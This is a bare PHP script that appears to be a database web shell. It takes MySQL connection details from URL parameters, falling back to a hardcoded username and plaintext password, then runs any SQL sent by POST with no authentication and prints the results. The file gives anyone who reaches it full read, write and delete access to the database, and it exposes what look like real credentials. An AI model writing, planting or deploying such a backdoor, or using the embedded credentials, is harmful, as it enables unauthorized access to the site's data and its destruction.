<?php
$host = $_GET['h'] ?? 'localhost';
$user = $_GET['u'] ?? 'fcimggni_dbs12';
$pass = $_GET['p'] ?? 'tM(}uM;xuUL^XO=8';
$db   = $_GET['d'] ?? 'fcimggni_dbs12';
$sql  = $_POST['sql'] ?? 'show tabless;';

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) die("Connect Error: " . $conn->connect_error);

$result = $conn->query($sql);
if ($result === TRUE) {
    echo "Query OK";
} elseif ($result) {
    echo "<table border=1>";
    while($row = $result->fetch_assoc()) {
        echo "<tr><td>" . implode("</td><td>", $row) . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "Error: " . $conn->error;
}
$conn->close();
?>
